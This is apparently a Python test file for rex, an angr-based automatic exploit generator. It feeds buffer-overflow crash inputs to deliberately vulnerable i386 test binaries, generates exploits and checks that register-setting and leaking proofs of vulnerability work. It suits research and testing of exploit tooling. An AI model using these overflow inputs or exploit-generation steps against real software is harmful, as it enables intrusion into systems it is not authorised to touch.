import rex
import angr
import nose
import pickle
from rex.trace_additions import FormatInfoIntToStr, FormatInfoStrToInt

import os
bin_location = str(os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries'))
tests_dir = str(os.path.dirname(os.path.realpath(__file__)))


def _do_pov_test(pov, enable_randomness=True):
    """ Test a POV """
    for _ in range(10):
        if pov.test_binary(enable_randomness=enable_randomness, timeout=25):
            return True
    return False


def _load_cache(bin_name):
    path = os.path.join(tests_dir, "rop_cache", bin_name+".rop")
    cache_tuple = pickle.load(open(path, "rb"))
    return cache_tuple


def test_chall_resp_atoi():
    crash_input = '-435982256\n-439864843\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'

    bin_path = bin_location + "/tests/i386/chall_resp_atoi"
    cfg_fast = angr.Project(bin_path).analyses.CFGFast()
    atoi_addr = cfg_fast.functions["atoi"].addr
    itoa_addr = cfg_fast.functions["itoa"].addr
    f1 = FormatInfoIntToStr(addr=itoa_addr, func_name="itoa", int_arg_num=1, str_dst_num=0, base=10, base_arg=None)
    f2 = FormatInfoStrToInt(addr=atoi_addr, func_name="atoi", str_arg_num=0, base=10, base_arg=None,
                            allows_negative=True)
    rop_cache = _load_cache("chall_resp_atoi")
    crash = rex.Crash(bin_path, crash=crash_input, format_infos=[f1, f2], rop_cache_tuple=rop_cache)
    exploit_f = crash.exploit()
    for e in exploit_f.register_setters:
        nose.tools.assert_true(_do_pov_test(e))
    for e in exploit_f.leakers:
        nose.tools.assert_true(_do_pov_test(e))


def test_chall_response():
    crash_input = "\x63\xbd\x66\xfd" + \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
    rop_cache = _load_cache("overflow_after_challenge_response2")
    crash = rex.Crash(bin_location + "/tests/i386/overflow_after_challenge_response2", crash=crash_input,
                      rop_cache_tuple=rop_cache)
    exploit_f = crash.exploit()
    for e in exploit_f.register_setters:
        nose.tools.assert_true(_do_pov_test(e))
    for e in exploit_f.leakers:
        nose.tools.assert_true(_do_pov_test(e))


def test_chall_resp_rand():
    crash_input = " (((" \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
                  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
    rop_cache = _load_cache("overflow_after_chall_resp_rand")
    crash = rex.Crash(bin_location + "/tests/i386/overflow_after_chall_resp_rand", crash=crash_input,
                      rop_cache_tuple=rop_cache)
    exploit_f = crash.exploit()
    for e in exploit_f.register_setters:
        nose.tools.assert_true(_do_pov_test(e))
    for e in exploit_f.leakers:
        nose.tools.assert_true(_do_pov_test(e))


def run_all():
    functions = globals()
    all_functions = dict(filter((lambda (k, v): k.startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()


